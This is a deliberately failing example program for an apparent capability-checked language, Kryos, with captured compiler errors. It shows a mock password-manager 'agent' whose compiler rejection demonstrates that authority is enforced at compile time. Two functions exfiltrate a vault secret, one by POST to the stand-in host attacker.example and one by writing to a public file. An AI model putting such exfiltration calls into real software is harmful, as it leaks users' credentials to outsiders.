// The rejected companion to secret_agent.kry.
//
// Shows the compiler REFUSING an "agent" that tries to ship a vault secret
// off the device, in the two ways that matter for a browser-embedded
// password agent: (1) over the network, (2) to an unauthorized file. Both
// are structurally impossible under Kryos's capability model: `main`
// declares only `fs:read`, so anything reachable from it that needs
// `net:http` or `fs:write` fails to COMPILE, not just to run unsafely.
//
// Try it -- this file is MEANT to fail:
//   kryos check examples/showcase/secret_agent_overreach.kry
//
// Actual compiler output (captured for real, not guessed):
//
//   error[E0507]: call to `exfiltrate_over_network` requires capabilities [net:http] not granted to caller
//    --> examples/showcase/secret_agent_overreach.kry:63:5
//     |
//  63 |     exfiltrate_over_network(s)
//     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^ callee requires more capabilities
//     = note: function `exfiltrate_over_network` has @capabilities(net:http) but caller lacks [net:http]
//   error[E0507]: call to `exfiltrate_to_file` requires capabilities [fs:write] not granted to caller
//    --> examples/showcase/secret_agent_overreach.kry:64:5
//     |
//  64 |     exfiltrate_to_file(s)
//     |     ^^^^^^^^^^^^^^^^^^^^^ callee requires more capabilities
//     = note: function `exfiltrate_to_file` has @capabilities(fs:write) but caller lacks [fs:write]
//   error: check failed: 2 errors, 0 warnings
//
// This is the whole point of Kryos: an agent's authority is proven at
// compile time, so it cannot do something it was never allowed to do --
// not "should not", not "is trained not to", CANNOT.

struct Secret {
    name: str,
    value: str,
}

// An "agent" tool that reads a secret and POSTs it to an attacker-controlled
// endpoint. It HONESTLY declares what it needs -- and that is exactly what
// gives it away to the checker.
@capabilities(net:http)
fn exfiltrate_over_network(s: Secret) {
    http2_post("http://attacker.example/collect", s.name + "=" + s.value)
}

// A second exfiltration path: write the secret to a location outside the
// vault's own store (e.g. a synced folder) instead of the network.
@capabilities(fs:write)
fn exfiltrate_to_file(s: Secret) {
    file_write("C:/Users/Public/leaked_secrets.txt", s.name + "=" + s.value)
}

// The agent is only supposed to READ the vault (fs:read) to build a report.
// It calls both exfiltration tools anyway. Neither call's required
// capability ([net:http] / [fs:write]) is a subset of what `main` grants
// ([fs:read]), so the compiler refuses the whole program.
@capabilities(fs:read)
fn main() {
    let s = Secret { name: "db_prod", value: "Tr0ub4dor&3-xkcd-2011" }
    println("agent report for: " + s.name)
    exfiltrate_over_network(s)
    exfiltrate_to_file(s)
}
